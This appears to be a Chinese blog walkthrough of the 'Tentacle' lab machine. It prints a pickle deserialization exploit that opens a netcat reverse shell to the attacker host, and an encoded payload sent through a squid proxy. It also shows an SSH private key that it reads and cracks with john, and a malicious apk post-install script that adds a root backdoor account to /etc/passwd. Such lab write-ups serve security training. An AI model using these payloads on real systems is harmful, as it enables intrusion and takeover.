+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plain">─# curl -i -s -x http://192.168.56.21:3128 http://127.0.0.1:5000/api/status<br>HTTP/1.1 200 OK<br>Server: Werkzeug/3.1.6 Python/3.12.12<br>Date: Mon, 30 Mar 2026 01:16:17 GMT<br>Content-Type: application/json<br>Content-Length: 81<br>Cache-Status: Tentacle;fwd=stale;detail=match<br>Via: 1.1 Tentacle (squid/6.12)<br>Connection: keep-alive<br><br>&#123;&quot;cpu&quot;:&quot;12%&quot;,&quot;main_process&quot;:&quot;~operator/Tentacle/app.py&quot;,&quot;memory&quot;:&quot;450MB/2048MB&quot;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>发现关键~operator&#x2F;Tentacle&#x2F;app.py</p>
+<p>访问得到源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs plain"># curl -i -s -x http://192.168.56.21:3128 http://127.0.0.1/~operator/Tentacle/app.py<br>HTTP/1.1 200 OK<br>Date: Mon, 30 Mar 2026 01:17:36 GMT<br>Server: Apache/2.4.66 (Unix)<br>Last-Modified: Wed, 25 Feb 2026 02:52:07 GMT<br>ETag: &quot;653-64b9d16fe490d&quot;<br>Accept-Ranges: bytes<br>Content-Length: 1619<br>Cache-Status: Tentacle;detail=mismatch<br>Via: 1.1 Tentacle (squid/6.12)<br>Connection: keep-alive<br><br>import pickle<br>import base64<br>import os<br>import logging<br>from flask import Flask, request, jsonify<br><br>app = Flask(__name__)<br><br>logging.basicConfig(<br>    level=logging.INFO,<br>    format=&#x27;%(asctime)s - INTERNAL_ADMIN - %(levelname)s - %(message)s&#x27;<br>)<br><br>INTERNAL_TOKEN = &quot;Secret_Admin_Token_2026&quot;<br><br>@app.route(&#x27;/&#x27;)<br>def index():<br>    return &quot;&lt;h1&gt;Tentacle Internal Management API&lt;/h1&gt;&lt;p&gt;Status: Running&lt;/p&gt;&quot;<br><br>@app.route(&#x27;/api&#x27;)<br>@app.route(&#x27;/api/&#x27;)<br>def api_index():<br>    return jsonify(&#123;&quot;error&quot;: &quot;Forbidden&quot;, &quot;message&quot;: &quot;Direct access to API root is not allowed.&quot;&#125;), 403<br><br>@app.route(&#x27;/api/deploy&#x27;, methods=[&#x27;POST&#x27;])<br>def deploy_task():<br>    auth_header = request.headers.get(&#x27;X-Internal-Auth&#x27;)<br>    <br>    task_data = request.form.get(&#x27;task_data&#x27;)<br>    <br>    if not task_data:<br>        return jsonify(&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Missing task_data&quot;&#125;), 400<br><br>    try:<br>        decoded_data = base64.b64decode(task_data)<br>        obj = pickle.loads(decoded_data)<br>        <br>        logging.info(f&quot;Task received and processed: &#123;type(obj).__name__&#125;&quot;)<br>        return jsonify(&#123;&quot;status&quot;: &quot;success&quot;, &quot;message&quot;: &quot;Deployment initiated&quot;&#125;), 200<br>        <br>    except Exception as e:<br>        logging.error(f&quot;Failed to process task: &#123;str(e)&#125;&quot;)<br>        return jsonify(&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Invalid task format&quot;&#125;), 500<br><br>@app.route(&#x27;/api/status&#x27;)<br>def system_status():<br>    return jsonify(&#123;<br>        &quot;cpu&quot;: &quot;12%&quot;,<br>        &quot;memory&quot;: &quot;450MB/2048MB&quot;,<br>        &quot;main_process&quot;: &quot;~operator/Tentacle/app.py&quot;,<br>    &#125;)<br><br>if __name__ == &quot;__main__&quot;:<br>    print(&quot;Tentacle Backend Service starting on http://127.0.0.1:5000&quot;)<br>    app.run(host=&#x27;127.0.0.1&#x27;, port=5000, debug=False)<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/49970571/1774833530332-ed4cf62e-7084-4b47-8a05-cb9da340cf5d.png" srcset="/img/loading.gif" lazyload></p>
+<p>这个因为没有任何过滤 我们可以使用 Pickle 反序列化漏洞  进行反弹shell</p>
+<h2 id="3-Pickle-反序列化漏洞-getshell"><a href="#3-Pickle-反序列化漏洞-getshell" class="headerlink" title="3.  Pickle 反序列化漏洞 -&gt;getshell"></a>3.  Pickle 反序列化漏洞 -&gt;getshell</h2><p>exp.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plain">import pickle<br>import base64<br>import os<br><br>class RCE:<br>    def __reduce__(self):<br>        # 这是一个经典的 Bash 反弹 Shell 命令<br>        cmd = &quot;busybox nc 192.168.56.2 4444 -e sh&quot;<br>        return os.system, (cmd,)<br><br>if __name__ == &#x27;__main__&#x27;:<br>    # 生成恶意的 pickle 对象并进行 Base64 编码<br>    malicious_data = pickle.dumps(RCE())<br>    payload = base64.b64encode(malicious_data).decode()<br>    print(&quot;你的 task_data Payload 是:&quot;)<br>    print(payload)<br></code></pre></td></tr></table></figure>
+
+<p>生成值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">你的 task_data Payload 是:<br>gASVPQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCJidXN5Ym94IG5jIDE5Mi4xNjguNTYuMiA0NDQ0IC1lIHNolIWUUpQu<br></code></pre></td></tr></table></figure>
+
+<p>kali开启监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">nc -lvnp 4444<br></code></pre></td></tr></table></figure>
+
+<p> 通过代理发送 Payload  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">curl -i -s -X POST -x http://192.168.56.21:3128 \<br>  -d &quot;task_data=gASVPQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCJidXN5Ym94IG5jIDE5Mi4xNjguNTYuMiA0NDQ0IC1lIHNolIWUUpQu&quot; \<br>  http://127.0.0.1:5000/api/deploy<br></code></pre></td></tr></table></figure>
+
+<p>反弹成功</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/49970571/1774833777213-6d09d5ab-fc28-41aa-a16d-7795236c6888.png" srcset="/img/loading.gif" lazyload></p>
+<p>写个ssh稳定shell</p>
+<p>然后再连</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">靶机<br>ssh-keygen -t rsa -f /home/operator/.ssh/id_rsa -N &quot;&quot;<br>cat ~/.ssh/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys <br>cat ~/.ssh/id_rsa（复制到攻击机） <br>攻击机<br>vim operator_key<br>chmod 600 operator_key<br>ssh -i operator_key operator@192.168.56.21  <br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/49970571/1774834132064-d0901f00-33ab-46fb-8d0f-4c6250b90b69.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="4-提权至licksore用户"><a href="#4-提权至licksore用户" class="headerlink" title="4.提权至licksore用户"></a>4.提权至licksore用户</h2><p>翻了半天没找到啥提权的信息，群里发了提示：</p>
+<p>网页的波浪号到底是什么呢</p>
+<p>看到operator下有个public_html</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/49970571/1774834991501-cba71b67-95fc-4998-8d8e-78183d4e16d4.png" srcset="/img/loading.gif" lazyload></p>
+<p>让ai简单分析一下</p>
+<h3 id="🏠-什么是-public-html？"><a href="#🏠-什么是-public-html？" class="headerlink" title="🏠 什么是 public_html？"></a>🏠 什么是 <code>public_html</code>？</h3><p>简单来说，它是 Linux 系统中专门用来存放<strong>个人用户 Web 网站文件</strong>的经典目录。</p>
+<p>在很多配置了 Apache Web 服务器的系统上（比如这台靶机），如果管理员开启了一个叫 <code>**mod_userdir**</code> 的模块，那么系统里的每一个普通用户，都可以在自己的家目录（<code>/home/用户名/</code>）下创建一个名叫 <code>public_html</code> 的文件夹。</p>
+<p>那这样看来，licksore用户也有吧应该</p>
+<p>访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">Tentacle:~/public_html$ ls -al /home/licksore/public_html                                                            <br>total 16                                                                                                             <br>drwxr-xr-x    3 licksore licksore      4096 Feb 25 10:44 .                                                           <br>drwx-----x    4 licksore licksore      4096 Feb 25 10:39 ..                                                          <br>drwxr-xr-x    2 licksore licksore      4096 Feb 25 10:43 .ssh                                                        <br>-rw-r--r--    1 licksore licksore        28 Feb 24 22:56 index.html<br></code></pre></td></tr></table></figure>
+
+<p>发现有个.ssh</p>
+<p>可以读取私钥</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs plain">cat  /home/licksore/public_html/.ssh/id_rsa<br>-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAEecoyn8<br>FswnK5npBrVZ4uAAAAGAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQDZ5M9v8S/q<br>MEaaH06lnrA46UpRGcmrI3Um9kpaBj500MXz0wpApyAvw26MBqnymGfOGfg1B+njaDmheY<br>26NYmeMzzcRAYcE3EtI43zLu6l+84+Tvd7sr29ZnmB4sRQzbckYhMAEy42VLlNN1TN1R5a<br>nL76JTDtCVY4Vuw8d/tFxr4iSo4X+2gh2daOf1Fb09BuLWbNh61XEd4b1tPUI0eK5ri7Xx<br>T783pexIp0PCbAuj5ZLDa+SZFjrKVufSJmO13A3+7ML3ZWeqqsKzAHy7SScdYC2uiH/CGl<br>ZFWshWyfS8Yo2uA2biWg1d6c5Tjoaw6RezK9yZgETqfQfIH+qhmW2tEdASxriX/l0rVeXC<br>vNFTexZfM223CqjrvUDmha4LEMM7bWxa3MRygB2Ok80xIhk3W8+dXD+HMS2+RRJOQYbfMW<br>lXvEgl0SutIZvEzw+NCws2aXh5esaA5q+zlyA8ejHswcMF/A5Ydm/F0EErrxp9eIr3ZXxb<br>M1z2yB9WmXQxsAAAWQP0vm4o0e34sz1QbdRFnAjkV/F2IRjOx3AOz4msTkfJhn9FkRoXx0<br>y4EitOoXBJeshjezxFNrunTyHT9CGtr2OAgimwdz8m6O4AhHv332tdywXcpgK0Z2IS5FSQ<br>oMuRrscUkrRW/HWrLOj1pP9tM3N5coWHiNGqjJbeG1oAddPcIGO0ZwwwKzQtqwvjaxlt0U<br>CXpm6f324Hk1VwxZ4p4mrTxY7M81LSS02ji40qggWsX2KbZwYbiD1KZ0aB9oi56ZhZuEMI<br>Vpoigg3frosaSPpyBrZpb3XmzBy24OGCeccYG9bI/8ve7MqJJiPGPCBkkd7LX9fvb9l57A<br>BxMsRQYNLp8IFXW/bGbnEPvop9Wtmy5rRUTin20chNEGUiDj4ggKTSml4ZENTT+TCIY/9h<br>QQnyrgqM5GqHtKlpqYVRINE/3phaIaflkBWWgk9QOeGZLJC+eVXUkOMX9U5BcfraO9tg58<br>X7IJboWoIq8i52PEwUidTZuNvvCPrV9rJOaSVWen4Ehf9VD5n3KE5B8InVpuP27wu8Mjq0<br>JudIHtpImHTDY2FkKBW/99tnNconb3b5reAM1LeFDJR9KuYtiBgstgdsPdm8VdYwTbEYZu<br>wnGWDUe/ooEqNSC/prd/IhZB+lKcTbvZ2447iWo/t46GXb9rLaX8fTaV4wcjl3J5SMP65I<br>MRzex3BywwzEb7Ih4OKd7LTn/Odkn1wJXTQUCFLOWgNplu1YHoLBE1Q3r4k3bdcrnJS5IH<br>kf7Vebly1388RCySgaEOpwSuO0GeDiXqYiW7bs30NIHSJZNJus5gSL4vHZZaVwYLzCNkfB<br>L6DznNkFfApiK0Q55cNBaeEWSri1dm9tW20eIUQdUU2d4n0KToN3x5ZeZovOEFgL1tw02A<br>g7tn3rxEKz1hgP124dlIa7SGGTcYuP3sdcf/+F1ZvRNjzhSwGITEhgOEA8z6gqbUA9zBqr<br>7iAdbtB9ful/0Nm2+1q8EuaAatDjKmhVgQPfh/DDD7i3BkILGuKgMhIDMiJfW4/wX6fLgM<br>eFBTlW7wx+aKkgVfBRX11EFUxXxvqrs8RGsoP6Zsr/Wd4NPk2ShzMEOZg7GSFs2kvzZC4b<br>5Vo2cfl5r5kay3rFGcE5zuWTRmJI/o84WuulSL4cpYyRwlLdxU1TmkUpro7kC5jTvgLNUG<br>ZZjjz3N+juYhT1yZof2aehhdwxskLGYBoqks4DllVFDD2E/FBQgUyjtTgJrKX7f/qW5/z8<br>IfWrnKNfKC2OvyIbzgnU4bxuXn60DWL6OlmLX8fV6425Nje/XfhkG76fdtkUkOO+7EXO7d<br>5KRBBcXDNL4VU7gbgb/21uoYQI1mNm/lILw0bRIOOXmRNjIJDUVjFcRjatLIl6skLxHhzZ<br>2ReU4lVrywsUHWz5zgtmonzVkVAbuHgy3TEpDY3jCi6moaSwQZ0QmfmXjMkODU0iDWc5yl<br>VJkP8vTzkSg62FcTLN/FEoqcO6n8NR0ChA/dAy/0t4u4Mzfb4FhyhOfqvnn8yQD2LHFMdh<br>rvI/eMouJUyxvFa2JL+tDKabS7bwHMp9383R94gYbMLLHXFH9UiMfFlBSXY6iHSjN6S6ak<br>376jDCv39b+CpVb9uZSlkVX5mapGylleLIfTjlxC49YqNPsHi/SsfKTWhYbIGFO2dzyn04<br>+cFUWqoeuUGpFceArTlwzYmtBaXJdV1i8mdY9tershPN680dW8KGLZZmzD5cp7x6w4DD/0<br>m32uFGPVSra7kANPVad9cqrRIa5BtCiDNKYfUXTUSpPBvNK2ev57vRa/YZD4nvGnZV865c<br>0tAYcI7Hmyyx6nTqQR2aUSsP/emUWqjOGdy0CRqfBf6LEvwkaJlV1z+qPNeZnwnXfeODUD<br>7/eMCbAKlvQ6t7oPmxwlCONa3fU=<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure>
+
+<p>保存到本地</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/49970571/1774835506353-2e9886ee-1202-4721-9e04-1790bd270b62.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现得输入私钥 用john破解一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">ssh2john licksore_key &gt; licksore_hash.txt<br>john --wordlist=/usr/share/wordlists/rockyou.txt licksore_hash.txt<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/49970571/1774835755776-24233150-dbbb-4b6f-9786-c96235c9d3b3.png" srcset="/img/loading.gif" lazyload></p>
+<p>密钥是justice</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/49970571/1774835787102-2c242780-cbb5-4896-95b3-7feb5199914d.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功提权至licksore用户</p>
+<h2 id="5-提权至root用户"><a href="#5-提权至root用户" class="headerlink" title="5.提权至root用户"></a>5.提权至root用户</h2><p>使用sudo -l  发现不用输入密码就可以运行的apk</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/49970571/1774835838501-662f859a-e0fe-468a-a052-22d0d97eee6a.png" srcset="/img/loading.gif" lazyload></p>
+<p>跟网上的照着敲下来的</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_79518550/article/details/158431683">https://blog.csdn.net/2301_79518550&#x2F;article&#x2F;details&#x2F;158431683</a></p>
+<p>不过要注意的是 这里没有bash环境 有sh的</p>
+<ol>
+<li>准备目录</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">mkdir -p /tmp/evil-pkg/pkg<br>cd /tmp/evil-pkg<br></code></pre></td></tr></table></figure>
+
+
+
+<ol start="2">
+<li>创建元 数据文件 .PKGINFO</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plain">cat &gt; pkg/.PKGINFO &lt;&lt; &#x27;EOF&#x27;<br>pkgname = evil-pwn<br>pkgver = 1.0.0<br>pkgdesc = Test package for privilege escalation demo<br>url = http://example.com<br>builddate = 1735680000<br>packager = root &lt;root@localhost&gt;<br>size = 4096<br>arch = x86_64<br>EOF<br><br></code></pre></td></tr></table></figure>
+
+
+
+<ol start="3">
+<li>创建 post-install 脚本</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plain">cat &gt; pkg/.post-install &lt;&lt; &#x27;EOF&#x27;<br>#!/bin/sh<br>set -e<br><br>echo &#x27;root2:aacFCuAIHhrCM:0:0:root:/root:/bin/sh&#x27; &gt;&gt; /etc/passwd<br>echo &quot; [!] Exploit payload executed successfully!&quot;<br>EOF<br><br>chmod +x pkg/.post-install<br><br></code></pre></td></tr></table></figure>
+
+<p>这里密码是1</p>
+<ol start="4">
+<li>打包成 apk</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">cd pkg<br>tar -czf ../evil-pwn.apk .PKGINFO .post-install<br>cd ..<br><br></code></pre></td></tr></table></figure>
+
+
+
+<ol start="5">
+<li>安装并触发提权</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">sudo apk add --allow-untrusted ./evil-pwn.apk<br><br></code></pre></td></tr></table></figure>
+
+
+
+<p>预期输出示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">WARNING: Support for packages without datahash will be dropped in apk-tools 3.<br>(1/1) Installing evil-pwn (1.0.0)<br>WARNING: Support for packages without datahash will be dropped in apk-tools 3.<br>Executing evil-pwn-1.0.0.post-install<br> [!] Exploit payload executed successfully!<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<ol start="6">
+<li>验证提权成功</li>
+</ol>
+<p>tail &#x2F;etc&#x2F;passwd</p>
+<h1 id="应该有我们添加的后门用户"><a href="#应该有我们添加的后门用户" class="headerlink" title="应该有我们添加的后门用户"></a>应该有我们添加的后门用户</h1><p>直接su root2 密码为1 就可以进去了</p>
+<h2 id="6-靶场小结"><a href="#6-靶场小结" class="headerlink" title="6.靶场小结"></a>6.靶场小结</h2><p><img src="https://cdn.nlark.com/yuque/0/2026/jpeg/49970571/1774836494088-413bb601-49f6-4fe1-8e25-edfc136c84ae.jpeg" srcset="/img/loading.gif" lazyload alt="画板"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="category-chain-item">靶机</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E9%9D%B6%E6%9C%BA/Mazesec%E5%B9%B3%E5%8F%B0/" class="category-chain-item">Mazesec平台</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/" class="print-no-link">#靶场复现</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Tentacle</div>
+      <div>https://shanran123.github.io/2026/03/30/Tentacle-山然/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>山然</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年3月30日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+<style> .aplayer-fixed { left: auto !important; right: 20px !important; } </style>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"> <script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+<meting-js server="netease" type="playlist" id="8493582484" fixed="true" autoplay="true" theme="#2980b9" loop="all" order="list" list-folded="true"> </meting-js> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
